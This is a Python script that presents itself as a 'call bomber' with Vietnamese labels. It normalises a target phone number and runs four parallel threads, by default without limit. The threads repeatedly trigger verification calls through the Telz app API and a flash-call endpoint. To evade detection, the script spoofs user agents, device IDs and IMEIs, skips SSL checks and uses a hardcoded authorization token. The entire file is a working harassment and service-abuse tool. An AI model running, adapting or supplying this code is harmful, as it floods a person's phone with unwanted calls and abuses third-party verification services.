import subprocess
import sys
import importlib

required_packages = ['requests', 'aiohttp', 'colorama', 'fake-useragent']

for package in required_packages:
    try:
        if package == 'fake-useragent':
            importlib.import_module('fake_useragent')
        else:
            importlib.import_module(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])

import requests, json, time, uuid, threading, asyncio, aiohttp, sys, re, random, os
from threading import Lock, Thread
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
from fake_useragent import UserAgent

init(autoreset=True)

ua = UserAgent()

BASE = "https://api.telz.com/"
GOKU = 300

class RateLimit:
    def __init__(self): 
        self.data, self.lock = {}, Lock()
    def can(self, key):
        with self.lock:
            now = time.time()
            if key in self.data and now - self.data[key] < GOKU: 
                return False
            self.data[key] = now
            return True
            
limiter = RateLimit()

class Telz:
    def __init__(self, aid=None):
        self.aid = aid or uuid.uuid4().hex[:16]
        self.uuid = str(uuid.uuid4())
        self.s = requests.Session()
        random_ua = ua.random
        self.s.headers.update({
            "User-Agent": random_ua,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive"
        })
    
    def _post(self, ep, data):
        data.update({
            "android_id": self.aid, 
            "app_version": f"{random.randint(15,20)}.{random.randint(0,9)}.{random.randint(0,99)}",
            "os": "android", 
            "os_version": str(random.randint(10,15)), 
            "ts": int(time.time()*1000), 
            "uuid": self.uuid
        })
        try:
            response = self.s.post(BASE+ep, json=data, timeout=5)
            if response.status_code == 429:
                return {"status": "rate_limit"}
            return response.json()
        except:
            return {"status": "error"}
    
    def call(self, phone):
        if not limiter.can(phone): 
            return {"status": "error", "reason": "Rate limit"}
        try:
            self._post("app/auth_list", {"event": "auth_list"})
            self._post("app/run", {"event": "run", "device_name": f"Pixel-{uuid.uuid4().hex[:6]}"})
            self._post("app/stat_btns", {"event": "stat_btns", "btn": "on_reg_continue"})
            self._post("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": phone, "region": "TR"})
            return self._post("app/auth_call", {"event": "auth_call", "phone": phone, "attempt": "0", "lang": "tr"})
        except:
            return {"status": "error"}

def chuan_hoa_so_dien_thoai(so):
    so = re.sub(r'[\s\-\(\)]', '', so)
    if so.startswith('0'):
        so = '+84' + so[1:]
    elif so.startswith('84'):
        so = '+' + so
    elif not so.startswith('+'):
        so = '+84' + so
    return so

async def hemo_call(session, phone):
    random_ua = ua.random
    headers_hemo = {
        'User-Agent': random_ua,
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8",
        'Authorization': "s6abj8F2euaFCk6",
        'Accept': "*/*",
        'Accept-Language': "vi-VN,vi;q=0.9"
    }
    try:
        async with session.post(
            "https://31.171.171.90/api/phone-numbers/auth-flash-call",
            data=json.dumps({"phoneNumber": phone}),
            headers=headers_hemo,
            ssl=False,
            timeout=aiohttp.ClientTimeout(total=5)
        ) as req:
            response_text = await req.text()
            return '{"allow":true}' in response_text
    except:
        return False

def dexron_call(phone):
    try:
        khach_hang = TelzKhachHang(android_id=uuid.uuid4().hex[:16])
        khach_hang.danh_sach_xac_thuc()
        khach_hang.chay()
        khach_hang.thong_ke_nut()
        khach_hang.xac_thuc_so_dien_thoai(phone)
        ket_qua = khach_hang.goi_xac_thuc(phone)
        return bool(ket_qua)
    except:
        return False

class BoGioiHan:
    def __init__(self, gioi_han_giay=300):
        self.gioi_han_giay = float(gioi_han_giay)
        self.cac_yeu_cau = {}
        self.khoa = Lock()
    
    def cho_phep(self, khoa):
        hien_tai = time.time()
        with self.khoa:
            yeu_cau_cu = self.cac_yeu_cau.get(khoa)
            if yeu_cau_cu is None or (hien_tai - yeu_cau_cu) >= self.gioi_han_giay:
                self.cac_yeu_cau[khoa] = hien_tai
                return True
            return False

bo_gioi_han = BoGioiHan(gioi_han_giay=300)

class TelzKhachHang:
    url_goc = "https://api.telz.com/"
    
    def __init__(self, android_id=None, phien_ban_ung_dung="17.5.33", loai_he_dieu_hanh="android", phien_ban_he_dieu_hanh="15"):
        self.android_id = android_id or uuid.uuid4().hex[:16]
        self.phien_ban_ung_dung = phien_ban_ung_dung
        self.loai_he_dieu_hanh = loai_he_dieu_hanh
        self.phien_ban_he_dieu_hanh = phien_ban_he_dieu_hanh
        self.uuid = str(uuid.uuid4())
        self.phien = requests.Session()
        random_ua = ua.random
        self.tieu_de = {
            'User-Agent': random_ua,
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'Accept': "*/*",
            'Accept-Language': "vi-VN,vi;q=0.9",
            'Connection': "keep-alive"
        }
    
    def _gui_post(self, duong_dan, du_lieu, thoi_gian_cho=5.0):
        url = self.url_goc + duong_dan
        du_lieu.update({
            "android_id": self.android_id,
            "app_version": self.phien_ban_ung_dung,
            "os": self.loai_he_dieu_hanh,
            "os_version": self.phien_ban_he_dieu_hanh,
            "ts": int(time.time() * 1000),
            "uuid": self.uuid
        })
        try:
            phan_hoi = self.phien.post(url, data=json.dumps(du_lieu), headers=self.tieu_de, timeout=thoi_gian_cho)
            if phan_hoi.status_code == 429:
                raise RuntimeError("Rate limit")
            phan_hoi.raise_for_status()
            return phan_hoi.json()
        except:
            return {}
    
    def danh_sach_xac_thuc(self):
        return self._gui_post("app/auth_list", {"event": "auth_list"})
    
    def chay(self, ten_thiet_bi=None, ipv4="10.1.10.1", ipv6="FE80::1", ngon_ngu="vi"):
        ten_thiet_bi = ten_thiet_bi or f"Pixel-{uuid.uuid4().hex[:6]}"
        return self._gui_post("app/run", {
            "event": "run",
            "device_name": ten_thiet_bi,
            "ipv4_address": ipv4,
            "ipv6_address": ipv6,
            "lang": ngon_ngu,
            "network_country": "vn",
            "network_type": "4G",
            "roaming": "no",
            "root": "no",
            "run_id": "",
            "sim_country": "vn"
        })
    
    def thong_ke_nut(self, nut="on_reg_continue"):
        return self._gui_post("app/stat_btns", {"event": "stat_btns", "btn": nut})
    
    def xac_thuc_so_dien_thoai(self, so_dien_thoai, vung="VN"):
        return self._gui_post("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": so_dien_thoai, "region": vung})
    
    def goi_xac_thuc(self, so_dien_thoai, lan_thu="0", ngon_ngu="vi"):
        if not bo_gioi_han.cho_phep(so_dien_thoai):
            raise RuntimeError("Rate limit")
        return self._gui_post("app/auth_call", {"event": "auth_call", "phone": so_dien_thoai, "attempt": lan_thu, "lang": ngon_ngu})

def telz_fix_call(phone):
    try:
        android_id = ''.join(random.choices('0123456789abcdef', k=16))
        uuid_str = str(uuid.uuid4())
        imei = ''.join(str(random.randint(0, 9)) for _ in range(15))
        random_ua = ua.random
        
        headers = {
            'User-Agent': random_ua,
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json; charset=UTF-8',
            'X-IMEI': imei,
            'X-Request-ID': str(uuid.uuid4()),
            'Connection': 'close',
            'Cache-Control': 'no-cache'
        }
        
        session = requests.Session()
        
        data = {
            "event": "auth_list",
            "android_id": android_id,
            "app_version": f"{random.randint(15,20)}.{random.randint(0,9)}.{random.randint(0,99)}",
            "os": "android",
            "os_version": str(random.randint(10,14)),
            "ts": int(time.time() * 1000),
            "uuid": uuid_str
        }
        session.post("https://api.telz.com/app/auth_list", json=data, headers=headers, timeout=5)
        
        data["event"] = "run"
        data["device_name"] = f"Android {random.randint(10,14)}"
        data["lang"] = "vi"
        data["network_type"] = "4G"
        data["root"] = "no"
        session.post("https://api.telz.com/app/run", json=data, headers=headers, timeout=5)
        
        data["event"] = "validate_phonenumber"
        data["phone"] = phone
        data["region"] = "VN"
        session.post("https://api.telz.com/app/validate_phonenumber", json=data, headers=headers, timeout=5)
        
        data["event"] = "auth_call"
        data["attempt"] = "0"
        data["lang"] = "vi"
        response = session.post("https://api.telz.com/app/auth_call", json=data, headers=headers, timeout=5)
        return response.status_code == 200
    except:
        return False

class BomberManager:
    def __init__(self, max_calls=0):
        self.running = True
        self.max_calls = max_calls
        self.call_counts = {
            "telz": 0,
            "hemo": 0,
            "dexron": 0,
            "telzfix": 0
        }
        self.stats = {
            "telz": {"sent": 0, "success": 0, "fail": 0},
            "hemo": {"sent": 0, "success": 0, "fail": 0},
            "dexron": {"sent": 0, "success": 0, "fail": 0},
            "telzfix": {"sent": 0, "success": 0, "fail": 0}
        }
        self.lock = Lock()
    
    def can_continue(self, mode):
        with self.lock:
            if self.max_calls == 0:
                return True
            return self.call_counts[mode] < self.max_calls
    
    def increment_count(self, mode):
        with self.lock:
            self.call_counts[mode] += 1
    
    def update_stats(self, mode, success=True):
        with self.lock:
            self.stats[mode]["sent"] += 1
            if success:
                self.stats[mode]["success"] += 1
            else:
                self.stats[mode]["fail"] += 1
    
    def display_stats(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("=" * 70)
        print("   ☎️  FOREX CALL BOMBER - 4 CHE DO CHAY CUNG LUC")
        print("=" * 70)
        if self.max_calls > 0:
            print(f"\n🎯 MUC TIEU: {self.max_calls} cuoc goi/mode")
        print(f"\n📊 THONG KE TONG HOP:")
        print(f"  🔴 TELZ BOMBER     : {self.stats['telz']['sent']} lan ({self.call_counts['telz']}/{self.max_calls if self.max_calls>0 else '∞'})")
        print(f"     ✅ Thanh cong: {self.stats['telz']['success']}  ❌ That bai: {self.stats['telz']['fail']}")
        print(f"  🟡 HEMO CALLER     : {self.stats['hemo']['sent']} lan ({self.call_counts['hemo']}/{self.max_calls if self.max_calls>0 else '∞'})")
        print(f"     ✅ Thanh cong: {self.stats['hemo']['success']}  ❌ That bai: {self.stats['hemo']['fail']}")
        print(f"  🟢 DEXRON BOMBER   : {self.stats['dexron']['sent']} lan ({self.call_counts['dexron']}/{self.max_calls if self.max_calls>0 else '∞'})")
        print(f"     ✅ Thanh cong: {self.stats['dexron']['success']}  ❌ That bai: {self.stats['dexron']['fail']}")
        print(f"  🟣 TELZ-FIX BOMBER : {self.stats['telzfix']['sent']} lan ({self.call_counts['telzfix']}/{self.max_calls if self.max_calls>0 else '∞'})")
        print("-" * 70)
        total = sum(self.stats[m]["sent"] for m in self.stats)
        success = sum(self.stats[m]["success"] for m in self.stats)
        print(f"  📈 TONG CONG: {total} cuoc goi | ✅ {success} thanh cong | ❌ {total-success} that bai")
        print(f"  🎯 Ty le thanh cong: {(success/total*100):.1f}%" if total > 0 else "  🎯 0%")
        print("=" * 70)
        print("  ⏱️  Dang chay... Nhan Ctrl+C de dung")

def worker_telz(manager, phone):
    telz = Telz()
    while manager.running and manager.can_continue("telz"):
        try:
            result = telz.call(phone)
            success = result.get("status") == "ok"
            manager.update_stats("telz", success)
            manager.increment_count("telz")
        except:
            manager.update_stats("telz", False)
            manager.increment_count("telz")
        time.sleep(random.uniform(1, 3))

def worker_hemo(manager, phone):
    async def run():
        async with aiohttp.ClientSession() as session:
            while manager.running and manager.can_continue("hemo"):
                try:
                    success = await hemo_call(session, phone)
                    manager.update_stats("hemo", success)
                    manager.increment_count("hemo")
                except:
                    manager.update_stats("hemo", False)
                    manager.increment_count("hemo")
                await asyncio.sleep(random.uniform(1, 3))
    asyncio.run(run())

def worker_dexron(manager, phone):
    while manager.running and manager.can_continue("dexron"):
        try:
            success = dexron_call(phone)
            manager.update_stats("dexron", success)
            manager.increment_count("dexron")
        except:
            manager.update_stats("dexron", False)
            manager.increment_count("dexron")
        time.sleep(random.uniform(1, 3))

def worker_telzfix(manager, phone):
    while manager.running and manager.can_continue("telzfix"):
        try:
            success = telz_fix_call(phone)
            manager.update_stats("telzfix", success)
            manager.increment_count("telzfix")
        except:
            manager.update_stats("telzfix", False)
            manager.increment_count("telzfix")
        time.sleep(random.uniform(1, 3))

def main():
    if len(sys.argv) < 2:
        print("=" * 70)
        print("   ☎️  FOREX CALL BOMBER - 4 CHE DO CHAY CUNG LUC")
        print("=" * 70)
        phone = input("📞 Nhap so dien thoai (+84 hoac 0): ").strip()
        max_calls = input("🎯 Nhap so lan goi cho moi mode (0 de chay vo han): ").strip()
        max_calls = int(max_calls) if max_calls.isdigit() else 0
    else:
        phone = sys.argv[1]
        max_calls = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    
    phone = chuan_hoa_so_dien_thoai(phone)
    
    print(f"\n✅ Da chuyen doi sang: {phone}")
    if max_calls > 0:
        print(f"🎯 MOI CHE DO SE GOI {max_calls} LAN")
    else:
        print("🎯 CHE DO VO HAN - CHAY DEN KHI BAN DUNG")
    print("\n⚙️ 4 CHE DO DANG CHAY SONG SONG:")
    print("  🔴 TELZ BOMBER     - Gui lien tuc")
    print("  🟡 HEMO CALLER     - Gui lien tuc")
    print("  🟢 DEXRON BOMBER   - Gui lien tuc")
    print("  🟣 TELZ-FIX BOMBER - Gui lien tuc")
    print("\n🚀 Bat dau tan cong...")
    print("=" * 70)
    
    manager = BomberManager(max_calls=max_calls)
    
    try:
        t1 = Thread(target=worker_telz, args=(manager, phone))
        t1.daemon = True
        t1.start()
        
        t2 = Thread(target=worker_hemo, args=(manager, phone))
        t2.daemon = True
        t2.start()
        
        t3 = Thread(target=worker_dexron, args=(manager, phone))
        t3.daemon = True
        t3.start()
        
        t4 = Thread(target=worker_telzfix, args=(manager, phone))
        t4.daemon = True
        t4.start()
        
        while manager.running:
            manager.display_stats()
            total_counts = sum(manager.call_counts.values())
            if max_calls > 0 and total_counts >= max_calls * 4:
                manager.running = False
                break
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n\n🛑 Dang dung tat ca cac che do...")
        manager.running = False
        time.sleep(1)
        print("✅ Da dung hoan toan!")
        
        print("\n📊 TONG KET CUOI CUNG:")
        total = sum(manager.stats[m]["sent"] for m in manager.stats)
        success = sum(manager.stats[m]["success"] for m in manager.stats)
        fail = total - success
        print(f"  📞 Tong cuoc goi: {total}")
        print(f"  ✅ Thanh cong: {success}")
        print(f"  ❌ That bai: {fail}")
        print(f"  🎯 Ty le: {(success/total*100):.1f}%" if total > 0 else "  🎯 0%")
        print("\n👨‍💻 Da ket thuc!")

if __name__ == "__main__":
    main()